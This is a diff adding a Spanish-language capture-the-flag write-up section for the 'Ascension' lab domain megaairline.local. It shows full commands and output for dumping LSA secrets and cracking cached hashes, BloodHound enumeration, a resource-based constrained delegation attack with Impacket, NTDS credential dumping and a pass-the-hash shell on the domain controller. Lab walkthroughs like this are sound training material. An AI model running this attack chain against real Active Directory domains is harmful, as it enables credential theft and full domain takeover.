@@ -1218,5 +1218,149 @@ ms01\administrator
 PS C:\> type C:\Users\Administrator\Desktop\flag.txt
 ASCENSION{sL4ck*************}
 ```
+Entiendo. Al realizar el volcado de los secretos LSA de este equipo, descubrimos varios hashes en formato mscash2, uno de los cuales corresponde a un usuario llamado "anna" que aún no hemos utilizado. Aunque el diccionario predeterminado "rockyou.txt" no resultó útil en este caso, al probar con contraseñas que tenemos del mismo laboratorio, descubrimos que "anna" reutiliza la contraseña del usuario "Administrator" en MS01.
 
+```bash
+❯ crackmapexec smb ms01.megaairline.local -u Administrator -p FWErfsgt4ghd7f6dwx --local-auth --lsa
+SMB         ms01.megaairline.local 445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
+SMB         ms01.megaairline.local 445    MS01             [+] MS01\Administrator:FWErfsgt4ghd7f6dwx (Pwn3d!)
+SMB         ms01.megaairline.local 445    MS01             [+] Dumping LSA secrets
+SMB         ms01.megaairline.local 445    MS01             MEGAAIRLINE.LOCAL/Administrator:$DCC2$10240#Administrator#3ea6e70c7142de7e521195f33086a2bf: (2021-06-09 12:56:43)
+SMB         ms01.megaairline.local 445    MS01             MEGAAIRLINE.LOCAL/elliot:$DCC2$10240#elliot#1985a8159434672943be0d4f94cea4b2: (2020-10-16 15:54:05)
+SMB         ms01.megaairline.local 445    MS01             MEGAAIRLINE.LOCAL/anna:$DCC2$10240#anna#beff6c5d84183e72d1ef69f18051ed49: (2020-10-14 14:54:00)
+SMB         ms01.megaairline.local 445    MS01             MEGAAIRLINE\MS01$:aes256-cts-hmac-sha1-96:a134ed2a75cbd3ff0be93c11d979fecd5cf81ff7c9194b8eea3c368efb5d8b3c
+SMB         ms01.megaairline.local 445    MS01             MEGAAIRLINE\MS01$:aes128-cts-hmac-sha1-96:a271a2cc8d68a84c3ee70450a976bfdc
+SMB         ms01.megaairline.local 445    MS01             MEGAAIRLINE\MS01$:des-cbc-md5:c76e529e62c28ae0
+SMB         ms01.megaairline.local 445    MS01             MEGAAIRLINE\MS01$:plain_password_hex:40e0e091a87bcb8ef7b8d715da6ebe499ab5fa7494a3d2c4f704a871f131ab5908d97abde6ef23214fd85d209067b0dc14b606407308a6fd5e190c465f91868de51efc531baae61087b2ad4fd5509433c3f9c648e130e4e3680f49acd3d94804a3d7437f859997d11ed885f8af3f937842004b7dfca47a2ac977534a4244bfcfa2fa73bd0cbf3618c54aff2e17fd54b7ad270c9c1c9c4f68277a19b8885a1d53cfa5f1e43e7f1bacfabcb6b2a8fa570bbe2310365d9b49aedf48c660cddf166f145ac7a9a72b584849ec7605719c3f71d0d132ab3824fac0db227a859af2148dbbd551824133acd775119b5b86c3d9ca  
+SMB         ms01.megaairline.local 445    MS01             MEGAAIRLINE\MS01$:aad3b435b51404eeaad3b435b51404ee:1a60da9a2479af44780749249ed6248f:::
+SMB         ms01.megaairline.local 445    MS01             dpapi_machinekey:0x487772fbffedccd08b08239af25f7c42a0c2ab76
+dpapi_userkey:0x36cbede3241336b34893574f96c27a7411f18a6c
+SMB         ms01.megaairline.local 445    MS01             NL$KM:33eb2a1da2aff443ecaf9f474df4857987a84e71648fd00f94e3041305cdda929bd1eb02ea266e4b0e77996a29737c20d1767bb63e7f42cf108aaa01d849883d
+```
 
+```bash
+❯ john -w:passwords hashes
+Warning: detected hash type "mscash2", but the string is also recognized as "HMAC-MD5"
+Use the "--format=HMAC-MD5" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 3 password hashes with 3 different salts (mscash2, MS Cache Hash 2 (DCC2) [PBKDF2-SHA1 128/128 XOP 4x2])  
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Warning: Only 1 candidate left, minimum 16 needed for performance.
+FWErfsgt4ghd7f6dwx (MEGAAIRLINE.LOCAL/anna)
+Use the "--show --format=mscash2" options to display all of the cracked passwords reliably
+Session completed.
+```
+
+Después de verificar las credenciales con crackmapexec, confirmamos que son válidas a nivel de dominio.
+
+```bash
+❯ crackmapexec smb dc2.megaairline.local -u anna -p FWE**************d7f6dwx
+SMB         megaairline.local 445    DC2              [*] Windows 10.0 Build 17763 x64 (name:DC2) (domain:megaairline.local) (signing:True) (SMBv1:False)  
+SMB         megaairline.local 445    DC2              [+] megaairline.local\anna:FWErfsgt4ghd7f6dwx
+```
+
+Después de subir el archivo zip a Bloodhound, realizamos la enumeración partiendo del usuario "anna". Descubrimos que este usuario tiene privilegios de GenericAll sobre el equipo DC2, lo que significa que podría ser vulnerable a un ataque RBCD (Resource-Based Constrained Delegation). Este tipo de ataque puede ser llevado a cabo utilizando herramientas como Impacket, donde se crea una cuenta de equipo con "addcomputer" y luego se configura la delegación con "rbcd".
+
+```bash
+❯ bloodhound-python -u anna -p FWEr**************6dwx -ns 192.168.11.201 -d megaairline.local -c All --zip  
+INFO: Found AD domain: megaairline.local
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc2.megaairline.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 4 computers
+INFO: Connecting to LDAP server: dc2.megaairline.local
+INFO: Found 12 users
+INFO: Connecting to GC LDAP server: dc2.megaairline.local
+INFO: Found 53 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 1 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: 
+INFO: Querying computer: 
+INFO: Querying computer: MS01.megaairline.local
+INFO: Querying computer: DC2.megaairline.local
+INFO: Done in 00M 33S
+INFO: Compressing output into 20230901014306_bloodhound.zip
+```
+
+```powershell
+❯ impacket-addcomputer -computer-name attackersystem$ -computer-pass 123456 megaairline.local/anna:FWErfsgt4ghd7f6dwx
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Successfully added machine account attackersystem$ with password 123456.
+
+❯ impacket-rbcd -delegate-from attackersystem$ -delegate-to DC2$ -action write megaairline.local/anna:FWErfsgt4ghd7f6dwx  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] attackersystem$ can now impersonate users on DC2$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     attackersystem$   (S-1-5-21-775547830-308377188-957446042-9104)
+```
+
+Después de completar la delegación, el siguiente paso sería solicitar un ticket autenticándonos como el equipo creado ("attackersystem") suplantando al usuario "Administrator". Con este ticket, podríamos autenticarnos y conectarnos al DC utilizando "wmiexec".
+
+Alternativamente, para mayor comodidad, podríamos utilizar "crackmapexec" para dumpear el NTDS (Active Directory Domain Services) y así obtener los hashes en formato NT de todos los usuarios y equipos asociados a este dominio.
+
+```bash
+❯ impacket-getST -spn cifs/dc2.megaairline.local megaairline.local/'attackersystem$':123456 -impersonate Administrator  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] 	Requesting S4U2self
+[*] 	Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+
+❯ export KRB5CCNAME=Administrator.ccache
+```
+
+```powershell
+❯ impacket-wmiexec dc2.megaairline.local -k -no-pass -shell-type powershell  
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+PS C:\> whoami
+megaairline\administrator
+
+PS C:\>
+```
+
+```bash
+❯ crackmapexec smb dc2.megaairline.local -k --use-kcache --ntds drsuapi
+SMB         dc2.megaairline.local 445    DC2              [*] Windows 10.0 Build 17763 x64 (name:DC2) (domain:megaairline.local) (signing:True) (SMBv1:False)  
+SMB         dc2.megaairline.local 445    DC2              [+] megaairline.local\Administrator from ccache (Pwn3d!)
+SMB         dc2.megaairline.local 445    DC2              [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         dc2.megaairline.local 445    DC2              Administrator:500:aad3b435b514**************e:674f1a5c73f4faad8ddbf7f3bf86db60:::
+SMB         dc2.megaairline.local 445    DC2              Guest:501:aad3b435b51404ee**************6ae931b73c59d7e0c089c0:::
+SMB         dc2.megaairline.local 445    DC2              krbtgt:502:aad3b435b51404eeaad3b43**************b9e4ae8a97d001d:::
+SMB         dc2.megaairline.local 445    DC2              megaairline.local\elliot:1108:aad3b4**************ee:74fdf381a94e1e446aaedf1757419dcd:::
+SMB         dc2.megaairline.local 445    DC2              megaairline.local\anna:2101:aad3b435**************c7b3c5fe865d954d5b47013e21f:::
+SMB         dc2.megaairline.local 445    DC2              megaairline.local\thomas:2601:aad3b4**************cc1edee80e4469d0cb118be53:::
+SMB         dc2.megaairline.local 445    DC2              megaairline.local\pippa:2602:aad3b43**************e:f5b43ca4ad68bce5349f7cb4b3168e4e:::
+SMB         dc2.megaairline.local 445    DC2              megaairline.local\angela:2603:aad3**************04ee:df36ca14e6d8a3d06b2c895895dbf48a:::
+SMB         dc2.megaairline.local 445    DC2              megaairline.local\nigel:2604:aad3b**************:923ef4c82666a2116ac5deda0a6b2e52:::
+SMB         dc2.megaairline.local 445    DC2              megaairline.local\kate:2605:aad3b43**************a4486fa23aeb1752503add2:::
+SMB         dc2.megaairline.local 445    DC2              megaairline.local\emily:2606:aad3**************1404ee:24bfa93d0525c9f374467224de523a6f:::
+SMB         dc2.megaairline.local 445    DC2              DC2$:1000:aad3b435b51404ee**************d67901176f6168d325d9ee3919e82:::
+SMB         dc2.megaairline.local 445    DC2              MS01$:1106:aad3b435b51404e**************af44780749249ed6248f:::
+SMB         dc2.megaairline.local 445    DC2              attackersystem$:9104:aad3b435**************ee:32ed87bdb5fdc5e9cba88547376818d4:::
+SMB         dc2.megaairline.local 445    DC2              DAEDALUS$:1107:aad3b435b51404**************680a37bc4b11bc76657bc23341beffd6:::
+```
+
+Con el hash NT de Administrator en nuestro poder, podríamos conectarnos al DC2 utilizando "evil-winrm" y obtener una shell interactiva donde podríamos leer la flag.
+
+```powershell
+❯ evil-winrm -i dc2.megaairline.local -u Administrator -H 674f1a5**************f86db60  
+PS C:\Users\Administrator\Documents> whoami
+megaairline\administrator
+PS C:\Users\Administrator\Documents> type ..\Desktop\flag.txt
+ASCENSION{g0**************}
+PS C:\Users\Administrator\Documents>
+```
